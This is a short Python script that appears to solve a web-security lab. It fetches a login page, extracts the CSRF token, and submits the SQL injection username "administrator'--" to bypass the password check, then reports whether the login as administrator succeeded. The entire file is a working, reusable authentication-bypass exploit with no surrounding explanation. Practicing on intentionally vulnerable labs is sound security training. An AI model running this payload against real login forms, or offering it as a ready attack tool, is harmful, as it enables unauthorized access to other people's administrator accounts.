import requests
from bs4 import BeautifulSoup

# Login form URL
login_url = input("Enter your lab login URL: ")

# Create a session to ensure working on only one session.
session = requests.Session()

# GET request to login page to obtain CSRF token
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')

# Ensure the correct CSRF token name
csrf_token = soup.find('input', {'name': 'csrf'})['value']

# Print CSRF token for verification
if csrf_token:
    print("CSRF token initialized !\n")

# SQL Injection payload
payload = {
    'username': "administrator'--",
    'password': "yilmazdegirmenci",
    'csrf': csrf_token
}

# HTTP POST request through login form with payload
response = session.post(login_url, data=payload)

# Print used payload
print(f"Used payload:\nUsername: {payload['username']}\nPassword: {payload['password']}")

# Check response using response HTML output
if "Your username is: administrator" in response.text:
    print("SQL Injection succeed! \nLogged as administrator.")
else:
    print("SQL Injection failed.")
